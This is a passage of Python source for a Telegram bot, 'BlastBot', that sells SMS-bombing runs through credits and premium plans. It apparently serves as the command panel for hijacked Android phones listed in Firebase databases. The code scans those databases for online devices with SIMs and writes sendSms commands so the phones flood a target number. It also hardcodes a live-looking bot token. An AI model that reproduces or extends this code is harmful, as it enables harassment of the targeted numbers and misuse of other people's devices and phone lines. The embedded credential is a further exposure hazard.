import asyncio
import json
import os
import time
import logging
import random
import string
from datetime import datetime

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    FSInputFile,
    BufferedInputFile,
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"      # 🔥
EMOJI_STAR = "5372849966689566579"      # ⭐
EMOJI_ROCKET = "5359664288241829619"    # 🚀
EMOJI_CROWN = "6237927637906364256"     # 👑
EMOJI_SHIELD = "6235476345451716705"    # 🛡
EMOJI_MONEY = "6244678063775289843"     # 💰
EMOJI_PHONE = "6239930832128056797"     # 📱
EMOJI_CHECK = "4958689671950369798"     # ✅
EMOJI_CROSS = "4958900559139570572"     # ❌
EMOJI_WARNING = "4958526153955476488"   # ⚠️
EMOJI_LOCK = "4956719506027185156"      # 🔒
EMOJI_GIFT = "5084613633418199991"      # 🎁
EMOJI_BELL = "5098265504796115765"      # 🔔
EMOJI_GEAR = "5116414868357907335"      # ⚙️
EMOJI_VIDEO = "5372849966689566579"     # 📹

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789",
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def _apply_style(widget, style: str = "primary"):
    if style in ("primary", "success", "danger"):
        try:
            setattr(widget, "style", style)
        except Exception:
            pass
    return widget

def btn(
    text: str,
    callback_data: str,
    emoji_id: str = None,
    fallback_emoji: str = "",
    style: str = "primary",
) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        b = InlineKeyboardButton(text=label, callback_data=callback_data, icon_custom_emoji_id=emoji_id)
    else:
        b = InlineKeyboardButton(text=label, callback_data=callback_data)
    return _apply_style(b, style)

def btn_url(
    text: str,
    url: str,
    emoji_id: str = None,
    fallback_emoji: str = "",
    style: str = "primary",
) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        b = InlineKeyboardButton(text=label, url=url, icon_custom_emoji_id=emoji_id)
    else:
        b = InlineKeyboardButton(text=label, url=url)
    return _apply_style(b, style)

def style_btn(
    text: str,
    style: str = "primary",
    request_contact: bool = False,
    request_location: bool = False,
) -> KeyboardButton:
    kb_btn = KeyboardButton(
        text=sc(text),
        request_contact=request_contact,
        request_location=request_location,
    )
    return _apply_style(kb_btn, style)

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")],
        ],
        resize_keyboard=True,
    )

MAIN_OWNER = 8241730977
SUPER_ADMIN_NAME = "@Sakira540"
SUPER_ADMIN_LINK = "https://t.me/xtylishbedu"
SUPER_ADMINS = [8682912888]

BOT_TOKEN = "9273864914:AAGSMztMHacgkv_nhGhBNwo9EYzmnDxE_fQ"
LOG_CHANNEL_ID = -1004437456868

_DATA_FILE = "blast_bdata.json"
_VERSION = "v3-PREMIUM"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 60.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

DEFAULT_PREMIUM_PLANS = [
    {"id": "prem_1d", "name": "1 Day Plan", "price": 5, "duration_seconds": 86400, "label": "1 Day"},
    {"id": "prem_3d", "name": "3 Days Plan", "price": 10, "duration_seconds": 3 * 86400, "label": "3 Days"},
    {"id": "prem_7d", "name": "7 Days Plan", "price": 25, "duration_seconds": 7 * 86400, "label": "7 Days"},
    {"id": "prem_1m", "name": "1 Month Plan", "price": 60, "duration_seconds": 30 * 86400, "label": "1 Month"},
]

AUTO_MSG_TASK: asyncio.Task | None = None
AUTO_MSG_LAST_IDS: dict[int, int] = {}

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

class UserSession:
    __slots__ = ["uid", "cancelled", "sent", "failed", "task", "start_time", "lock", "number", "target_uid"]

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    import_db = State()
    custom_prem_value = State()
    give_prem_uid = State()
    give_prem_value = State()
    set_auto_msg_text = State()
    set_auto_msg_custom_min = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {
            "ref_credits": 3,
            "plans": list(DEFAULT_PREMIUM_PLANS),
        },
        "auto_msg": {
            "enabled": False,
            "text": "",
            "interval_minutes": 5,
            "last_sent_ids": {},
        },
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
    }

def load() -> dict:
    global PROTECTED_NUMBERS
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if not data.get("premium", {}).get("plans"):
                data.setdefault("premium", {})["plans"] = list(DEFAULT_PREMIUM_PLANS)
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                if "credits" not in u:
                    u["credits"] = 0
                if "sms_history" not in u:
                    u["sms_history"] = []
                if "premium_until" not in u:
                    u["premium_until"] = 0
            if isinstance(data.get("protected_numbers"), dict):
                PROTECTED_NUMBERS = dict(data["protected_numbers"])
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d

def save(d: dict):
    with open(_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name,
            "uses": 0,
            "credits": 0,
            "premium_until": 0,
            "joined_at": int(time.time()),
            "refer_code": None,
            "referred_by": None,
            "sms_history": [],
        }
        return True
    return False

def has_active_premium(uid: int, d: dict) -> bool:
    u = d.get("users", {}).get(str(uid), {})
    return int(u.get("premium_until", 0)) > int(time.time())

def grant_premium(uid: int, duration_seconds: int, d: dict) -> int:
    now = int(time.time())
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {
            "name": "User",
            "uses": 0,
            "credits": 0,
            "premium_until": 0,
            "joined_at": now,
            "refer_code": None,
            "referred_by": None,
            "sms_history": [],
        }
    current_until = int(d["users"][k].get("premium_until", 0))
    base = current_until if current_until > now else now
    new_until = base + duration_seconds
    d["users"][k]["premium_until"] = new_until
    return new_until

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()),
        "uid": uid,
        "action": action,
        "details": details,
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if has_active_premium(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid):
        return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d):
        return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []):
        return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if has_active_premium(uid, d):
        return f"{em(EMOJI_CROWN, '💎')} ᴘʀᴇᴍɪᴜᴍ"
    if uid in d.get("approved", []):
        return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"):
        return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn(t, c, style="primary") if not isinstance(t, InlineKeyboardButton) else t
                for t, c in row
            ]
            for row in rows
        ]
    )

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="success"),
                btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
                btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="primary"),
            ],
            [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")],
        ]
    )

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
        ]
    )

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

async def notify_owners_premium_request(
    bot: Bot, user_id: int, user_name: str, username: str, duration_label: str, price_text: str
):
    text = (
        f"{em(EMOJI_CROWN, '💎')} <b>NEW PREMIUM REQUEST</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} <b>User:</b> {user_name}\n"
        f"{em(EMOJI_GEAR, '🆔')} <b>User ID:</b> <code>{user_id}</code>\n"
        f"{em(EMOJI_BELL, '🌐')} <b>Username:</b> {username}\n"
        f"{em(EMOJI_ROCKET, '⏳')} <b>Duration:</b> <b>{duration_label}</b>\n"
        f"{em(EMOJI_MONEY, '💰')} <b>Price:</b> <b>{price_text}</b>\n\n"
        f"<i>Is user ko {duration_label} ka premium chahiye!</i>"
    )
    for oid in set([MAIN_OWNER] + SUPER_ADMINS):
        try:
            await bot.send_message(oid, text, parse_mode="HTML")
        except Exception as e:
            log.warning(f"Failed to notify owner {oid}: {e}")

async def auto_msg_loop(bot: Bot):
    global AUTO_MSG_LAST_IDS
    log.info("Auto Message loop started.")
    while True:
        try:
            d = load()
            am = d.get("auto_msg", {})
            if am.get("enabled") and am.get("text"):
                interval_min = max(1, int(am.get("interval_minutes", 5)))
                msg_body = am["text"]
                users = list(d.get("users", {}).keys())
                persisted_ids = am.get("last_sent_ids", {})

                for uid_str in users:
                    chat_id = int(uid_str)
                    prev_id = AUTO_MSG_LAST_IDS.get(chat_id) or persisted_ids.get(uid_str)
                    if prev_id:
                        try:
                            await bot.delete_message(chat_id=chat_id, message_id=int(prev_id))
                        except Exception:
                            pass
                    try:
                        sent_m = await bot.send_message(
                            chat_id=chat_id,
                            text=f"{em(EMOJI_BELL, '📢')} <b>{sc('auto broadcast')}</b>\n\n{msg_body}",
                            parse_mode="HTML",
                        )
                        AUTO_MSG_LAST_IDS[chat_id] = sent_m.message_id
                        persisted_ids[uid_str] = sent_m.message_id
                    except Exception:
                        pass
                    await asyncio.sleep(0.05)

                d["auto_msg"]["last_sent_ids"] = persisted_ids
                save(d)
                await asyncio.sleep(interval_min * 60)
            else:
                await asyncio.sleep(5)
        except Exception as e:
            log.error(f"Auto msg loop error: {e}")
            await asyncio.sleep(10)

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME
    if time_diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
    elif time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"
    else:
        return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict):
                        return

                    async def fetch_dev(dev_id: str):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if txt2 == "null" or not txt2:
                                            return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and any([
                                            dev_data.get("isOnline"),
                                            dev_data.get("online"),
                                            dev_data.get("connected"),
                                            dev_data.get("status") in ("online", "active", True, 1),
                                        ]):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {
                                                "fb_id": fb["id"],
                                                "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id,
                                                "dev_name": name,
                                                "sims": sims,
                                            }
                        except Exception as e:
                            log.warning(f"Device fetch {dev_id}: {e}")
                        return None

                    dev_ids = list(device_ids.keys())
                    for i in range(0, len(dev_ids), 20):
                        batch = dev_ids[i:i+20]
                        dev_results = await asyncio.gather(*(fetch_dev(dev_id) for dev_id in batch))
                        for res in dev_results:
                            if res:
                                results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG
    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()
        try:
            d = load()
            fbs = d.get("firebases", [])
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan
            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time()),
                }
            LAST_SCAN_TIME = time.time()

            DEVICE_HEALTH_LOG.append({
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices",
            })
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                current_fb_ids = {fb["id"] for fb in fbs}
                for stale in [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]:
                    FB_DEVICE_COUNTS.pop(stale, None)
                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>",
                            parse_mode="HTML",
                        )
                    except Exception:
                        pass
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time()),
        },
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:",
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="primary")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="success")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    am = d.get("auto_msg", {})
    am_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ ({am.get('interval_minutes', 5)}ᴍ)" if am.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    for fb_id, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    return (
